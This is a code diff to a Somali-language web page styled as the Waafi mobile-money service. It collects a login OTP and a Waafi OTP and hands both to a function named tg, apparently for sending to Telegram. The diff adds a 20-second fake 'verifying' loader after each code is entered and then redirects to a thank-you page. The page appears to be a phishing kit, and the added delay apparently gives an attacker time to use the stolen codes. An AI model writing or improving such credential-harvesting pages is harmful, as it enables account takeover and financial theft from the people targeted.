@@ -126,7 +126,7 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
 
 .otp-go{width:100%;margin-top:14px;padding:14px;border-radius:var(--r);border:none;background:linear-gradient(135deg,#93cc3a,#7bbf2e,#5a9020);font-family:var(--font);font-size:14px;font-weight:800;color:#fff;cursor:pointer;opacity:.4;pointer-events:none}
 .otp-go.on{opacity:1;pointer-events:auto}
-</style>
+.loader-ov{position:absolute;inset:0;background:rgba(255,255,255,.97);display:none;flex-direction:column;align-items:center;justify-content:center;z-index:300;gap:22px}.loader-ov.show{display:flex}.pulse-ring{position:relative;width:120px;height:120px;display:flex;align-items:center;justify-content:center}.pulse-ring::before,.pulse-ring::after{content:"";position:absolute;inset:0;border-radius:50%;border:3px solid #7bbf2e;animation:ripple 2s ease-out infinite}.pulse-ring::after{animation-delay:.8s}@keyframes ripple{0%{transform:scale(.7);opacity:.8}100%{transform:scale(1.5);opacity:0}}.pulse-inner{width:80px;height:80px;border-radius:50%;background:#f2f9e6;border:2px solid rgba(123,191,46,.28);display:flex;align-items:center;justify-content:center;z-index:1;animation:beat 1.5s ease-in-out infinite}@keyframes beat{0%,100%{transform:scale(1)}50%{transform:scale(1.07)}}.pulse-inner img{height:52px;object-fit:contain}.loader-text{font-size:14px;font-weight:700;color:#5a9020;text-align:center}.loader-sub{font-size:12px;color:#6b7280;text-align:center;margin-top:4px}</style>
 </head>
 <body>
 <div class="screen">
@@ -224,7 +224,6 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
         <button class="mclose" onclick="cm('m1')">✕</button>
       </div>
       <div class="mb">
-        <div class="msub">Gali Login OTP-ga 6-nambar ah</div>
         <div class="masked-note" id="mn1"></div>
         <div class="otp-wrap" id="ow1">
           <input type="text" id="oh1" inputmode="numeric" maxlength="6" autocomplete="one-time-code" class="otp-hidden">
@@ -275,7 +274,6 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
         <button class="mclose" onclick="cm('m2')">✕</button>
       </div>
       <div class="mb">
-        <div class="msub">Gali Waafi OTP-ga si aad u gudbiso</div>
         <div class="masked-note" id="mn2"></div>
         <div class="otp-wrap" id="ow2">
           <input type="text" id="oh2" inputmode="numeric" maxlength="6" autocomplete="one-time-code" class="otp-hidden">
@@ -292,6 +290,11 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
         <button class="otp-go" id="g2" onclick="submitOtp2()">Gudbi Codsiga ✓</button>
       </div>
     </div>
+  </div>
+
+  <div class="loader-ov" id="loaderOv">
+    <div class="pulse-ring"><div class="pulse-inner"><img src="assets/waafi.svg" alt="Waafi"></div></div>
+    <div><div class="loader-text" id="loaderText">La xaqiijinayaa...</div><div class="loader-sub">Fadlan sug...</div></div>
   </div>
 
 </div>
@@ -461,11 +464,18 @@ function startTimer(n){
   };
 }
 
+
+function showLoader(text,cb){
+  document.getElementById("loaderText").textContent=text;
+  document.getElementById("loaderOv").classList.add("show");
+  setTimeout(function(){document.getElementById("loaderOv").classList.remove("show");if(cb)cb();},20000);
+}
 function submitOtp1(){
   if(otp1Val.length!==6||otp1Done)return;
   otp1Done=true;
   tg("Login OTP");
-  cm("m1");buildSummary();om("msum");
+  cm("m1");
+  showLoader("La xaqiijinayaa...",function(){buildSummary();om("msum");});
 }
 
 function buildSummary(){
@@ -491,10 +501,12 @@ function submitOtp2(){
   tg("Waafi OTP",{"Login OTP":otp1Val,"Waafi OTP":otp2Val});
   sessionStorage.setItem("selectedPlan",JSON.stringify({...(P||{}),phone:phoneValue}));
   cm("m2");
-  document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"));
-  document.getElementById("step4").classList.add("active");
-  document.getElementById("mainBtn").style.display="none";
-  setTimeout(()=>{location.href="thankyou.html"},1400);
+  showLoader("La gudbinayaa codsiga...",function(){
+    document.querySelectorAll(".step").forEach(s=>s.classList.remove("active"));
+    document.getElementById("step4").classList.add("active");
+    document.getElementById("mainBtn").style.display="none";
+    setTimeout(function(){location.href="thankyou.html";},1400);
+  });
 }
 </script>
 </body>
